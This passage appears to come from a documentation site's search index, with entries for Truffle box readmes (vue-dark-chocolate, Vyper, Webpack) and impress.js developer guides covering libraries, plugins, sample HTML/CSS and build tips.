vue-bootstrap", "title": "vue-dark-chocolate"}, {"location": "boxes/vue-dark-chocolate/#vue-dark-chocolate", "text": "A truffle box that comes with everything you need to start using smart contracts from a Vue App with Bootstrap styling and components. Supporting frameworks include Vuex , Vue-Router & Bootstrap 4 (via Bootstrap-Vue) and webpack . The sample uses webpack-dev-server for hot-reloading or you can build and serve from express . This truffle box has a simplistic smart contract model for registering/tracking trades between two accounts, written in Solidity. A vendor account registers the trade and the counterparty account has to certify it. The logic is implemented in the smart contracts to support the full trade flow but the frontend is not fully wired-up. A good exercise is to finish wiring up the frontend to go through the entire flow of registering a trade and having the counterparty certify. This provides a complete view of reading and writing to smart contracts from a dApp via truffle and web3 APIs. The sample also uses a few web3 utility methods that demonstrate how you can convert between strings/hex values from the frontend JavaScript all the way through to Solidity smart contracts on the Ethereum blockchain. This has only been tested on Windows but should work just as well on Linux (said no one ever) . Restart-TestRpcInstance.ps1 is the only real Windows specific item, unless you have PowerShell on Linux . That said, it just stops/starts a testrpc instance with defaults geared towards easily running this box so should be fairly easy to adapt. To help reduce the learning curve to get started with Ethereum Blockchain and Truffle suite this sample includes some test data (in the form of testrpc accounts) and data seeding for smart contracts. To get started, you'll need to load the accounts in to Metamask. Check out testrpc-sample.md and use Metamask to import the HD Wallet mnemonic.", "title": "vue-dark-chocolate"}, {"location": "boxes/vue-dark-chocolate/#usage", "text": "If you landed here you probably already have truffle, but just in case: npm install -g truffle To initialize a project with this example, run truffle unbox kierenh/vue-dark-chocolate inside an empty directory. The Ethereum test server npm install -g ethereumjs-testrpc Install metamask (see also: Truffle and Metamask )", "title": "Usage"}, {"location": "boxes/vue-dark-chocolate/#building-and-running-smart-contract-unit-tests", "text": "Start an rpc instance Restart-TestRpcInstance.ps1 -networkID: 27666 (27666 is the ID of the network which is used at unit test time to skip data seeding, see truffle.js config) Run truffle compile Then run truffle test --network development-no-data-seed to deploy and test the contracts on the 'development-no-data-seed' network Highly recommend checking out the testing doc. At the very least, it's good to be aware of the CLEAN-ROOM ENVIRONMENT approach: CLEAN-ROOM ENVIRONMENT Truffle provides a clean room environment when running your test files. When running your tests against the TestRPC, Truffle will use the TestRPC's advanced snapshotting features to ensure your test files don't share state with each other. When running against other Ethereum clients like go-ethereum, Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against.", "title": "Building and running smart contract unit tests"}, {"location": "boxes/vue-dark-chocolate/#building-and-running-interact-via-truffle-console", "text": "Start an rpc instance Restart-TestRpcInstance.ps1 Then run truffle compile , then run truffle migrate to deploy the contracts onto your network of choice (default \"development\"). Then run truffle console See sample_console.md which shows how you can interact with the contracts via the console To exit .exit", "title": "Building and running (interact via truffle console)"}, {"location": "boxes/vue-dark-chocolate/#building-and-running-the-frontend-hot-reloading", "text": "Start an rpc instance Restart-TestRpcInstance.ps1 Then run truffle compile , then run truffle migrate to deploy the contracts onto your network of choice (default \"development\"). Then run npm run dev to build the app and serve it on http://localhost:8081 (with support for hot reloading)", "title": "Building and running the frontend (hot-reloading)"}, {"location": "boxes/vue-dark-chocolate/#building-and-running-the-frontend-express", "text": "Start an rpc instance Restart-TestRpcInstance.ps1 Then run truffle compile , then run truffle migrate to deploy the contracts onto your network of choice (default \"development\"). Then run npm run build (see the output in the build folder) Then run npm start to start the express server (serves the static content from the build folder)", "title": "Building and running the frontend (express)"}, {"location": "boxes/vue-dark-chocolate/#on-migrations", "text": "In combination with smart contract design, how migrations work, and how you reference deployed contracts is fairly fundamental, so just wanted to callout these docs to accelerate your learning (hopefully). The Migrations contract stores (in last_completed_migration) a number that corresponds to the last applied \"migration\" script, found in the migrations folder. Deploying this Migrations contract is always the first such step anyway. The numbering convention is x_script_name.js, with x starting at 1. Your real-meat contracts would typically come in scripts starting at 2_.... So, as this Migrations contract stores the number of the last deployment script applied, Truffle will not run those scripts again. On the other hand, in the future, your app may need to have a modified, or new, contract deployed. For that to happen, you create a new script with an increased number that describes the steps that need to take place. Then, again, after they have run once, they will not run again. what are truffle migrations on stackoverflow That's right, they won't run again, ever, so make sure your contract is ready for the wild because once it's on the blockchain, it's there forever! You can't really pull it back and add a field like you might with a database table :) When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that you're Ethereum client is connected to a specific network, they'll use the contract artifacts associated that network to simplify app deployment. truffle docs - advanced - configuration#networks", "title": "On migrations"}, {"location": "boxes/vue-dark-chocolate/#possible-upgrades", "text": "Upgrades welcome, just shoot through a pull request. Listen to events in the TradeRegister.sol and read historical events via web3 event/filter APIs Build and Release from VSTS to an Azure App Service ETHEREUM DEVOPS WITH TRUFFLE, TESTRPC & VISUAL STUDIO TEAM SERVICES & Ethereum DevOps with VSTS \u2013 easier now with new Truffle installer + npx", "title": "Possible upgrades"}, {"location": "boxes/vue-dark-chocolate/#errors-and-troubleshooting", "text": "", "title": "Errors and Troubleshooting"}, {"location": "boxes/vue-dark-chocolate/#chrome-metamask-testrpc", "text": "After going through the dev-test inner-loop cycle many times, there was an instance where the web app did not retrieve the correct data from the blockchain. There were 2 trades loaded, but I could only retrieve 1, and only for some accounts. In the web app, I could see it was not retrieving the correct number of trades for each actor (and subsequently could not look them up * correctly) by debugging the Javascript In truffle console, I was able to run ad-hoc queries and get the expected results Truffle test - the unit tests were all passing I'm fairly certain I closed/re-opened browser during this time, but what seemed to do the trick was forcing metamask to re-connect to the testrpc instance so I have put this down to a quirk in metamask connecting to testrpc (certainly the versions being used anyway). When I re-selected the network, the page refreshes and the web app returns the correct results. Basically this was just opening metamask and clicking on \"Localhost 8545\" which seemed to trigger some kind of refresh and things started working as expected. This post reports a similar problem: https://stackoverflow.com/questions/45585735/testrpc-the-tx-doesnt-have-the-correct-nonce There doesn't appear to be a great solution, the advice is to close browser instances etc and reconnect to the RPC.", "title": "Chrome, Metamask &amp; TestRPC"}, {"location": "boxes/vue-dark-chocolate/#truffle-test", "text": "It's important to be aware that tests that don't handle exceptions thrown from within promises correctly can cause subsequent tests to fail with misleading error messages. Perhaps tests in 1 suite work, but when combined with the whole test suite they fail. This is a good indication there's an exception thrown from within a promise is not handled correctly. Be sure to add a catch() handler to the top-level promise. To help troubleshoot, you can isolate tests by running individual files in Truffle. truffle test ./path/to/test/file.js", "title": "truffle test"}, {"location": "boxes/vue-dark-chocolate/#dev-notes-and-links", "text": "I'll leave the bulk of this to some of the resources I found helpful: solidity docs web3js 1.0 docs webpack A 101 Noob Intro to Programming Smart Contracts on Ethereum Blockchain fundamentals on PluralSight bytes32 VS string types on stackoverflow Solidity - Smart Contract Design - When to use contract and when to use structs on stackoverflow Get started with vue-bootstrap", "title": "Dev Notes and Links"}, {"location": "boxes/vyper-example/", "text": "Vyper Example Box \u00b6 This box contains a simple VyperStorage contract to show the basics of using Vyper with Truffle. Installation \u00b6 Install Truffle globally. Make sure you have v5.0.0 or higher. npm install -g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox vyper-example Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the tests. // If inside the development console. test // If outside the development console.. truffle test", "title": "Vyper Example Box"}, {"location": "boxes/vyper-example/#vyper-example-box", "text": "This box contains a simple VyperStorage contract to show the basics of using Vyper with Truffle.", "title": "Vyper Example Box"}, {"location": "boxes/vyper-example/#installation", "text": "Install Truffle globally. Make sure you have v5.0.0 or higher. npm install -g truffle Download the box. This also takes care of installing the necessary dependencies. truffle unbox vyper-example Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate Run the tests. // If inside the development console. test // If outside the development console.. truffle test", "title": "Installation"}, {"location": "boxes/webpack/", "text": "Webpack Truffle Box \u00b6 This box is our most bare official implementation with Webpack. Includes contracts, migrations, tests, user interface, and webpack build pipeline. Installation \u00b6 First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. npx truffle unbox webpack Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox webpack Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate In the app directory, we build and run our frontend. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd app npm run dev Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console.. truffle test To build the application for production, use the build script in the app folder. A production build will be in the app/dist folder. // ensure you are inside the client directory when running this npm run build FAQ \u00b6 Where is my production build? The production build will be in the app/dist folder after running npm run build in the app folder. Where can I find more documentation? This box is a marriage of Truffle and a Webpack setup. Either one would be a great place to start!", "title": "Webpack Truffle Box"}, {"location": "boxes/webpack/#webpack-truffle-box", "text": "This box is our most bare official implementation with Webpack. Includes contracts, migrations, tests, user interface, and webpack build pipeline.", "title": "Webpack Truffle Box"}, {"location": "boxes/webpack/#installation", "text": "First ensure you are in a new and empty directory. Run the unbox command via npx and skip to step 3. npx truffle unbox webpack Alternatively, you can install Truffle globally and run the unbox command. npm install - g truffle truffle unbox webpack Run the development console. truffle develop Compile and migrate the smart contracts. Note inside the development console we don't preface commands with truffle . compile migrate In the app directory, we build and run our frontend. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd app npm run dev Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console.. truffle test To build the application for production, use the build script in the app folder. A production build will be in the app/dist folder. // ensure you are inside the client directory when running this npm run build", "title": "Installation"}, {"location": "boxes/webpack/#faq", "text": "Where is my production build? The production build will be in the app/dist folder after running npm run build in the app folder. Where can I find more documentation? This box is a marriage of Truffle and a Webpack setup. Either one would be a great place to start!", "title": "FAQ"}, {"location": "case-studies/case-study-dish-network/", "text": "", "title": "Case Study - Dish Network"}, {"location": "case-studies/case-study-microsoft-and-the-world-bank/", "text": "", "title": "Case Study - Microsoft & The World Bank"}, {"location": "case-studies/case-study-microsoft-xbox/", "text": "", "title": "Case Study - Microsoft Xbox"}, {"location": "case-studies/case-study-starbucks/", "text": "", "title": "Case Study - Starbucks"}, {"location": "community/", "text": "", "title": "Community & Support"}, {"location": "devcon5/src/lib/", "text": "Impress.js Libraries \u00b6 The src/lib/*.js files contain library functions. The main difference to plugins is that: Libraries are closer to the impress.js core than plugins (arguably a subjective metric) Libraries are common utility functions used by many plugins Libraries are called synchronously, which is why the event based paradigm that plugins use to communicate isn't useful. Plugins can access libraries via the API: var api; document.addEventListener( \"impress:init\", function(event){ api = event.detail.api; api().lib.<libraryName>.<libaryFunction>(); }); ...which is equivalent to: impress().lib.<libraryName>.<libraryFunction>(); Implementing a library \u00b6 Create a file under src/lib/ . Start with the standard boilerplate documentation, and the (function(document, window){})(); wrapper. The library should implement a factory function, and make its existence known to impress.js core: window.impress.addLibraryFactory( { libName : libraryFactory} ); The library function should return a similar API object as core impress() function does: var libraryFactory = function(rootId) { / implement library functions ... / var lib = { libFunction1: libFunction1, libFunction2: libFunction2 } return lib; }; While rarely used, impress.js actually supports multiple presentation root div elements on a single html page. Each of these have their own API object, identified by the root element id attribute: impress(\"other-root-id\").init(); (The default rootId obviously is \"impress\" .) Libraries MUST implement this support for multiple root elements as well. impress.js core will call the factory once for each separate root element being initialized via impress.init(rootId) . Any state that a library might hold, MUST be stored per rootId . Note that as we now support also impress(rootId).tear() , the same root element might be initialized more than once, and each of these MUST be treated as a new valid initialization. Putting all of the above together, a skeleton library file will look like: /** * Example library libName * * Henrik Ingo (c) 2016 * MIT License */ (function ( document, window ) { 'use strict'; // Singleton library variables var roots = []; var singletonVar = {}; var libraryFactory = function(rootId) { if (roots[\"impress-root-\" + rootId]) { return roots[\"impress-root-\" + rootId]; } // Per root global variables (instance variables?) var instanceVar = {}; // LIBRARY FUNCTIONS var libraryFunction1 = function () { /* ... */ }; var libraryFunction2 = function () { /* ... */ }; var lib = { libFunction1: libFunction1, libFunction2: libFunction2 } roots[\"impress-root-\" + rootId] = lib; return lib; }; // Let impress core know about the existence of this library window.impress.addLibraryFactory( { libName : libraryFactory } ); })(document, window);", "title": "Impress.js Libraries"}, {"location": "devcon5/src/lib/#impressjs-libraries", "text": "The src/lib/*.js files contain library functions. The main difference to plugins is that: Libraries are closer to the impress.js core than plugins (arguably a subjective metric) Libraries are common utility functions used by many plugins Libraries are called synchronously, which is why the event based paradigm that plugins use to communicate isn't useful. Plugins can access libraries via the API: var api; document.addEventListener( \"impress:init\", function(event){ api = event.detail.api; api().lib.<libraryName>.<libaryFunction>(); }); ...which is equivalent to: impress().lib.<libraryName>.<libraryFunction>();", "title": "Impress.js Libraries"}, {"location": "devcon5/src/lib/#implementing-a-library", "text": "Create a file under src/lib/ . Start with the standard boilerplate documentation, and the (function(document, window){})(); wrapper. The library should implement a factory function, and make its existence known to impress.js core: window.impress.addLibraryFactory( { libName : libraryFactory} ); The library function should return a similar API object as core impress() function does: var libraryFactory = function(rootId) { / implement library functions ... / var lib = { libFunction1: libFunction1, libFunction2: libFunction2 } return lib; }; While rarely used, impress.js actually supports multiple presentation root div elements on a single html page. Each of these have their own API object, identified by the root element id attribute: impress(\"other-root-id\").init(); (The default rootId obviously is \"impress\" .) Libraries MUST implement this support for multiple root elements as well. impress.js core will call the factory once for each separate root element being initialized via impress.init(rootId) . Any state that a library might hold, MUST be stored per rootId . Note that as we now support also impress(rootId).tear() , the same root element might be initialized more than once, and each of these MUST be treated as a new valid initialization. Putting all of the above together, a skeleton library file will look like: /** * Example library libName * * Henrik Ingo (c) 2016 * MIT License */ (function ( document, window ) { 'use strict'; // Singleton library variables var roots = []; var singletonVar = {}; var libraryFactory = function(rootId) { if (roots[\"impress-root-\" + rootId]) { return roots[\"impress-root-\" + rootId]; } // Per root global variables (instance variables?) var instanceVar = {}; // LIBRARY FUNCTIONS var libraryFunction1 = function () { /* ... */ }; var libraryFunction2 = function () { /* ... */ }; var lib = { libFunction1: libFunction1, libFunction2: libFunction2 } roots[\"impress-root-\" + rootId] = lib; return lib; }; // Let impress core know about the existence of this library window.impress.addLibraryFactory( { libName : libraryFactory } ); })(document, window);", "title": "Implementing a library"}, {"location": "devcon5/src/plugins/", "text": "Impress.js Plugins documentation \u00b6 The default set of plugins \u00b6 A lot of impress.js features are and will be implemented as plugins. Each plugin has user documentation in a README.md file in its own directory . The plugins in this directory are called default plugins, and - unsurprisingly - are enabled by default. However, most of them won't do anything by default, rather require the user to invoke them somehow. For example: The navigation plugin waits for the user to press some keys, arrows, page down, page up, space or tab. The autoplay plugin looks for the HTML attribute data-autoplay to see whether it should do its thing. The toolbar plugin looks for a <div> element to become visible. Extra addons \u00b6 Yet more features are available in presentations that enable extra addons . Extra addons are 3rd party plugins that are not part of impress.js, but that we have nevertheless collected together into the impress-extras repo to provide convenient and standardized access to them. To include the extra addons when checking out impress.js, use git clone --recursive. Even then, they are not activated by default in a presentation, rather each must be included with their own <script> tag. Note: The enabled extra addons are automatically initialized by the extras plugin. Example HTML and CSS \u00b6 Generally plugins will do something sane, or nothing, by default. Hence, no particular HTML or CSS is required. The README file of each plugin documents the HTML and CSS that you can use with that plugin. For your convenience, below is some sample HTML and CSS code covering all the plugins that you may want to use or adapt. Sample HTML to enable plugins and extra addons \u00b6 <head> <!-- CSS files if using Highlight.js or Mermaid.js extras. --> <link rel=\"stylesheet\" href=\"../../extras/highlight/styles/github.css\"> <link rel=\"stylesheet\" href=\"../../extras/mermaid/mermaid.forest.css\"> </head> <body> <div id=\"impress\" data-autoplay=\"10\"> <div class=\"step\" data-autoplay=\"15\" data-rel-x=\"1000\" data-rel-y=\"1000\"> <h1>Slide content</h1> <ul> <li class=\"substep\">Point 1</li> <li class=\"substep\">Point 2</li> </ul> <div class=\"notes\"> Speaker notes are shown in the impressConsole. </div> </div> </div> <div id=\"impress-toolbar\"></div> <div class=\"impress-progressbar\"><div></div></div> <div class=\"impress-progress\"></div> <div id=\"impress-help\"></div> <script type=\"text/javascript\" src=\"../../extras/highlight/highlight.pack.js\"></script> <script type=\"text/javascript\" src=\"../../extras/mermaid/mermaid.min.js\"></script> <script type=\"text/javascript\" src=\"../../extras/markdown/markdown.js\"></script> <script type=\"text/javascript\" src=\"../../extras/mathjax/MathJax.js?config=TeX-AMS_CHTML\"></script> </body> Sample CSS related to plugins and extra addons \u00b6 /* Using the substep plugin, hide bullet points at first, then show them one by one. */ #impress .step .substep { opacity: 0; } #impress .step .substep.substep-visible { opacity: 1; transition: opacity 1s; } /* Speaker notes allow you to write comments within the steps, that will not be displayed as part of the presentation. However, they will be picked up and displayed by impressConsole.js when you press P. */ .notes { display: none; } /* Toolbar plugin */ .impress-enabled div#impress-toolbar { position: fixed; right: 1px; bottom: 1px; opacity: 0.6; z-index: 10; } .impress-enabled div#impress-toolbar > span { margin-right: 10px; } .impress-enabled div#impress-toolbar.impress-toolbar-show { display: block; } .impress-enabled div#impress-toolbar.impress-toolbar-hide { display: none; } /* If you disable pointer-events (like in the impress.js official demo), you need to re-enable them for the toolbar. And the speaker console while at it.*/ .impress-enabled #impress-toolbar { pointer-events: auto } .impress-enabled #impress-console-button { pointer-events: auto } /* Progress bar */ .impress-enabled .impress-progressbar { position: absolute; right: 318px; bottom: 1px; left: 118px; border-radius: 7px; border: 2px solid rgba(100, 100, 100, 0.2); } .impress-enabled .impress-progressbar DIV { width: 0; height: 2px; border-radius: 5px; background: rgba(75, 75, 75, 0.4); transition: width 1s linear; } .impress-enabled .impress-progress { position: absolute; left: 59px; bottom: 1px; text-align: left; opacity: 0.6; } .impress-enabled #impress-help { background: none repeat scroll 0 0 rgba(0, 0, 0, 0.5); color: #EEEEEE; font-size: 80%; position: fixed; left: 2em; bottom: 2em; width: 24em; border-radius: 1em; padding: 1em; text-align: center; z-index: 100; font-family: Verdana, Arial, Sans; } .impress-enabled #impress-help td { padding-left: 1em; padding-right: 1em; } For developers \u00b6 The vision for impress.js is to provide a compact core library doing the actual presentations, with a collection of plugins that provide additional functionality. A default set of plugins are distributed together with the core impress.js, and are located in this directory. They are called default plugins because they are distributed and active when users use the js/impress.js in their presentations. Building js/impress.js \u00b6 The common way to use impress.js is to link to the file js/impress.js . This is a simple concatenation of the core impress.js and all plugins in this directory. If you edit or add code under src/ , you can run node build.js to recreate the distributable js/impress.js file. The build script also creates a minified file, but this is not included in the git repository. Tip: Build errors \u00b6 If your code has parse errors, the build.js will print a rather unhelpful exception like /home/hingo/hacking/impress.js/js/impress.js /home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:271 throw new JS_Parse_Error(message, line, col, pos); ^ Error at new JS_Parse_Error (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:263:18) at js_error (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:271:11) at croak (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:733:9) at token_error (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:740:9) at unexpected (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:746:9) at Object.semicolon [as 1] (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:766:43) at prog1 (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:1314:21) at simple_statement (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:906:27) at /home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:814:19 at block_ (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:1003:20) You will be pleased to know, that the concatenation of the unminified file js/impress.js has already succeeded at this point. Just open a test in your browser, and the browser will show you the line and error. Structure, naming and policy \u00b6 Each plugin is contained within its own directory. The name of the directory is the name of the plugin. For example, imagine a plugin called pluginA : src/plugins/plugina/ The main javascript file should use the directory name as its root name: src/plugins/plugina/plugina.js For most plugins, a single .js file is enough. Note that the plugin name is also used as a namespace for various things. For example, the autoplay plugin can be configured by setting the data-autoplay=\"5\" attribute on a div . As a general rule ids, classes and attributes within the div#impress root element, may use the plugin name directly (e.g. data-autoplay=\"5\" ). However, outside of the root element, you should use impress-pluginname (e.g. <div id=\"impress-toolbar\"> . The latter (longer) form also applies to all events, they should be prefixed with impress:pluginname . You should use crisp and descriptive names for your plugins. But sometimes you might optimize for a short namespace. Hence, the Relative Positioning Plugin is called rel to keep html attributes short. You should not overuse this idea! Note that for default plugins, which is all plugins in this directory, NO css, html or image files are allowed. Default plugins must not add any global variables. Testing \u00b6 The plugin directory should also include tests, which should use the QUnit and Syn libraries under test/ . You can have as many tests as you like, but it is suggested your first and main test file is called plugina_tests.html and plugina_tests.js respectively. You need to add your test .js file into /qunit_test_runner.html , and the .js file should start by loading the test .html file into the iframe#presentation-iframe . See navigation-ui plugin for an example. You are allowed to test your plugin whatever way you like, but the general approach is for the test to load the js/impress.js file produced by build.js. This way you are testing what users will actually be using, rather than the uncompiled source code. HowTo write a plugin \u00b6 Encapsulation \u00b6 To avoid polluting the global namespace, plugins must encapsulate them in the standard javascript anonymous function: /** * Plugin A - An example plugin * * Description... * * Copyright 2016 Firstname Lastname, email or github handle * Released under the MIT license. */ (function ( document, window ) { // Plugin implementation... })(document, window); Init plugins \u00b6 We categorize plugins into various categories, based on how and when they are called, and what they do. An init plugin is the simplest kind of plugin. It simply listens for the impress().init() method to send the impress:init event, at which point the plugin can initialize itself and start doing whatever it does, for example by calling methods in the public api returned by impress() . The impress:init event has the div#impress element as its target attribute, whereas event.detail.api contains the same object that is returned by calling impress() . It is customary to store the api object sent by the event rather than calling impress() from the global namespace. Example: /** * Plugin A - An example plugin * * Description... * * Copyright 2016 Firstname Lastname, email or github handle * Released under the MIT license. */ (function ( document, window ) { var root; var api; var lib; document.addEventListener( \"impress:init\", function( event ) { root = event.target; api = event.detail.api; lib = api.lib; // Element attributes starting with \"data-\", become available under // element.dataset. In addition hyphenized words become camelCased. var data = root.dataset; // Get value of `<div id=\"impress\" data-plugina-foo=\"...\">` var foo = data.pluginaFoo; // ... } })(document, window); Both Navigation and Autoplay are init plugins. To provide end user configurability in your plugin, a good idea might be to read html attributes from the impress presentation. The Autoplay plugin does exactly this, you can provide a default value in the div#impress element, or in each div.step . A plugin must only use html attributes in its designated namespace, which is data-pluginName-*=\"value\" For example, if pluginA offers config options foo and bar , it would look like this: <div id=\"impress\" data-plugina-foo=\"5\" data-plugina-bar=\"auto\" > Pre-init plugins \u00b6 Some plugins need to run before even impress().init() does anything. These are typically filters : they want to modify the html via DOM calls, before impress.js core parses the presentation. We call these pre-init plugins . A pre-init plugin must be called synchronously, before impress().init() is executed. Plugins can register themselves to be called in the pre-init phase by calling: impress.addPreInitPlugin( plugin [, weight] ); The argument plugin must be a function. weight is optional and defaults to 10 . Plugins are ordered by weight when they are executed, with lower weight first. The Relative Positioning Plugin is an example of a pre-init plugin. Pre-StepLeave plugins \u00b6 A pre-stepleave plugin is called synchronously from impress.js core at the beginning of impress().goto() . To register a plugin, call impress.addPreStepLeavePlugin( plugin [, weight] ); When the plugin function is executed, it will be passed an argument that resembles the event object from DOM event handlers: event.target contains the current step, which we are about to leave. event.detail.next contains the element we are about to transition to. event.detail.reason contains a string, one of \"next\", \"prev\" or \"goto\", which tells you which API function was called to initiate the transition. event.detail.transitionDuration contains the transitionDuration for the upcoming transition. A pre-stepleave plugin may alter the values in event.detail (except for reason ), and this can change the behavior of the upcoming transition. For example, the goto plugin will set the event.detail.next to point to some other element, causing the presentation to jump to that step instead. GUI plugins \u00b6 A GUI plugin is actually just an init plugin, but is a special category that exposes visible widgets or effects in the presentation. For example, it might provide clickable buttons to go to the next and previous slide. Note that all plugins shipped in the default set must not produce any visible html elements unless the user asks for it. A recommended best practice is to let the user add a div element, with an id equaling the plugin's namespace, in the place where he wants to see whatever visual UI elements the plugin is providing: <div id=\"impress-plugina\"></div> Another way to show the elements of a UI plugin might be by allowing the user to explicitly press a key, like \"H\" for a help dialog. Toolbar plugin is an example of a GUI plugin. It presents a toolbar where other plugins can add their buttons in a centralized fashion. Remember that for default plugins, even GUI plugins, no html files, css files or images are allowed. Everything must be generated from javascript. The idea is that users can theme widgets with their own CSS. (A plugin is of course welcome to provide example CSS that can be copypasted :-) Dependencies \u00b6 If pluginB depends on the existence of pluginA , and also pluginA must run before pluginB , then pluginB should not listen to the impress:init event, rather pluginA should send its own init event, which pluginB listens to. Example: // pluginA document.addEventListener(\"impress:init\", function (event) { // plugin A does it's own initialization first... // Signal other plugins that plugin A is now initialized var root = document.querySelector( \"div#impress\" ); var event = document.createEvent(\"CustomEvent\"); event.initCustomEvent(\"impress:plugina:init', true, true, { \"plugina\" : \"data...\" }); root.dispatchEvent(event); }, false); // pluginB document.addEventListener(\"impress:plugina:init\", function (event) { // plugin B implementation }, false); A plugin should use the namespace impress:pluginname:* for any events it sends. In theory all plugins could always send an init and other events, but in practice we're adding them on an as needed basis.", "title": "Impress.js Plugins Documentation"}, {"location": "devcon5/src/plugins/#impressjs-plugins-documentation", "text": "", "title": "Impress.js Plugins documentation"}, {"location": "devcon5/src/plugins/#the-default-set-of-plugins", "text": "A lot of impress.js features are and will be implemented as plugins. Each plugin has user documentation in a README.md file in its own directory . The plugins in this directory are called default plugins, and - unsurprisingly - are enabled by default. However, most of them won't do anything by default, rather require the user to invoke them somehow. For example: The navigation plugin waits for the user to press some keys, arrows, page down, page up, space or tab. The autoplay plugin looks for the HTML attribute data-autoplay to see whether it should do its thing. The toolbar plugin looks for a <div> element to become visible.", "title": "The default set of plugins"}, {"location": "devcon5/src/plugins/#extra-addons", "text": "Yet more features are available in presentations that enable extra addons . Extra addons are 3rd party plugins that are not part of impress.js, but that we have nevertheless collected together into the impress-extras repo to provide convenient and standardized access to them. To include the extra addons when checking out impress.js, use git clone --recursive. Even then, they are not activated by default in a presentation, rather each must be included with their own <script> tag. Note: The enabled extra addons are automatically initialized by the extras plugin.", "title": "Extra addons"}, {"location": "devcon5/src/plugins/#example-html-and-css", "text": "Generally plugins will do something sane, or nothing, by default. Hence, no particular HTML or CSS is required. The README file of each plugin documents the HTML and CSS that you can use with that plugin. For your convenience, below is some sample HTML and CSS code covering all the plugins that you may want to use or adapt.", "title": "Example HTML and CSS"}, {"location": "devcon5/src/plugins/#sample-html-to-enable-plugins-and-extra-addons", "text": "<head> <!-- CSS files if using Highlight.js or Mermaid.js extras. --> <link rel=\"stylesheet\" href=\"../../extras/highlight/styles/github.css\"> <link rel=\"stylesheet\" href=\"../../extras/mermaid/mermaid.forest.css\"> </head> <body> <div id=\"impress\" data-autoplay=\"10\"> <div class=\"step\" data-autoplay=\"15\" data-rel-x=\"1000\" data-rel-y=\"1000\"> <h1>Slide content</h1> <ul> <li class=\"substep\">Point 1</li> <li class=\"substep\">Point 2</li> </ul> <div class=\"notes\"> Speaker notes are shown in the impressConsole. </div> </div> </div> <div id=\"impress-toolbar\"></div> <div class=\"impress-progressbar\"><div></div></div> <div class=\"impress-progress\"></div> <div id=\"impress-help\"></div> <script type=\"text/javascript\" src=\"../../extras/highlight/highlight.pack.js\"></script> <script type=\"text/javascript\" src=\"../../extras/mermaid/mermaid.min.js\"></script> <script type=\"text/javascript\" src=\"../../extras/markdown/markdown.js\"></script> <script type=\"text/javascript\" src=\"../../extras/mathjax/MathJax.js?config=TeX-AMS_CHTML\"></script> </body>", "title": "Sample HTML to enable plugins and extra addons"}, {"location": "devcon5/src/plugins/#sample-css-related-to-plugins-and-extra-addons", "text": "/* Using the substep plugin, hide bullet points at first, then show them one by one. */ #impress .step .substep { opacity: 0; } #impress .step .substep.substep-visible { opacity: 1; transition: opacity 1s; } /* Speaker notes allow you to write comments within the steps, that will not be displayed as part of the presentation. However, they will be picked up and displayed by impressConsole.js when you press P. */ .notes { display: none; } /* Toolbar plugin */ .impress-enabled div#impress-toolbar { position: fixed; right: 1px; bottom: 1px; opacity: 0.6; z-index: 10; } .impress-enabled div#impress-toolbar > span { margin-right: 10px; } .impress-enabled div#impress-toolbar.impress-toolbar-show { display: block; } .impress-enabled div#impress-toolbar.impress-toolbar-hide { display: none; } /* If you disable pointer-events (like in the impress.js official demo), you need to re-enable them for the toolbar. And the speaker console while at it.*/ .impress-enabled #impress-toolbar { pointer-events: auto } .impress-enabled #impress-console-button { pointer-events: auto } /* Progress bar */ .impress-enabled .impress-progressbar { position: absolute; right: 318px; bottom: 1px; left: 118px; border-radius: 7px; border: 2px solid rgba(100, 100, 100, 0.2); } .impress-enabled .impress-progressbar DIV { width: 0; height: 2px; border-radius: 5px; background: rgba(75, 75, 75, 0.4); transition: width 1s linear; } .impress-enabled .impress-progress { position: absolute; left: 59px; bottom: 1px; text-align: left; opacity: 0.6; } .impress-enabled #impress-help { background: none repeat scroll 0 0 rgba(0, 0, 0, 0.5); color: #EEEEEE; font-size: 80%; position: fixed; left: 2em; bottom: 2em; width: 24em; border-radius: 1em; padding: 1em; text-align: center; z-index: 100; font-family: Verdana, Arial, Sans; } .impress-enabled #impress-help td { padding-left: 1em; padding-right: 1em; }", "title": "Sample CSS related to plugins and extra addons"}, {"location": "devcon5/src/plugins/#for-developers", "text": "The vision for impress.js is to provide a compact core library doing the actual presentations, with a collection of plugins that provide additional functionality. A default set of plugins are distributed together with the core impress.js, and are located in this directory. They are called default plugins because they are distributed and active when users use the js/impress.js in their presentations.", "title": "For developers"}, {"location": "devcon5/src/plugins/#building-jsimpressjs", "text": "The common way to use impress.js is to link to the file js/impress.js . This is a simple concatenation of the core impress.js and all plugins in this directory. If you edit or add code under src/ , you can run node build.js to recreate the distributable js/impress.js file. The build script also creates a minified file, but this is not included in the git repository.", "title": "Building js/impress.js"}, {"location": "devcon5/src/plugins/#tip-build-errors", "text": "If your code has parse errors, the build.js will print a rather unhelpful exception like 